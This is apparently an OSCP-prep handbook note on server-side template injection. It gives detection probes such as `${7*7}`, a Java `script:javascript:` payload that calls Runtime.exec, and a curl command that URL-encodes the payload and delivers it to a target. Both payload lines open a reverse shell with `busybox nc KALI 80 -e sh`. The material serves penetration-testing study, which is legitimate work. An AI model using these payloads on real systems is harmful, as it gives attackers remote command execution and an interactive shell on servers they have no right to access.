---
title: "Server-Side Template Injection"
slug: server-side-template-injection
category: notes
handbook: oscp
tags: ["template-injection"]
draft: false
pubDatetime: 2026-09-08T22:24:21+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Server-side template injection (SSTI) is when input reaches a template engine as template code instead of as data."
---
Server-side template injection (SSTI) is when input reaches a template engine as template code instead of as data. Where [Command Injection](/collections/oscp/command-injection) reaches a shell, SSTI reaches the engine's own language, and on Java engines that means Java classes, so it usually ends in command execution. Probe a candidate field with arithmetic in the engine's delimiter style (`${7*7}` for most Java engines, `{{7*7}}` for Jinja2 and Twig): `49` coming back instead of the literal text means the input is evaluated.

## Command Execution on a Java Engine

When `${...}` evaluates on a Java app, the `script:javascript:` form runs the payload through the JVM's JavaScript engine, where Java classes are callable:

```
${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc KALI 80 -e sh')}
```

`busybox nc ... -e sh` is the command of choice, since it has no quotes, no redirections, and no bash-only features. See [Reverse Shells](/collections/oscp/reverse-shells).

The `script:javascript:` form is not a generic Java payload. It works only where the engine implements a script lookup; other Java stacks that evaluate `${...}` need their own payload for that engine.

## Delivery: Let curl Encode It

A payload that works through curl can fail with `HTTP Status 400 – Bad Request` when pasted into a browser. Browser URL handling leaves `{`, `}`, `'`, and parentheses unencoded in a query string, and Tomcat 8.5+ rejects raw braces in the request line before the application ever sees them. A Tomcat 400 means the request line was malformed, not that the payload failed.

Hand-encoding the whole payload works but one missed character breaks it, and copy-paste from a writeup or PDF mangles these easily. Let curl build the query string:

```bash
curl -G --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec("busybox nc KALI 80 -e sh")}' 'http://TARGET:8080/search'
```

- `-G` sends the data as a GET query string instead of a POST body.
- `--data-urlencode` percent-encodes the whole value, so braces, spaces, quotes, and parentheses all survive.
- Single quotes keep `${...}` out of the local shell's expansion. Where the payload needs its own quotes, use doubles inside, since single quotes cannot nest.

Burp Repeater is the other reliable channel: the request is edited as raw bytes, and Tomcat's 400 response body names the exact parse problem.
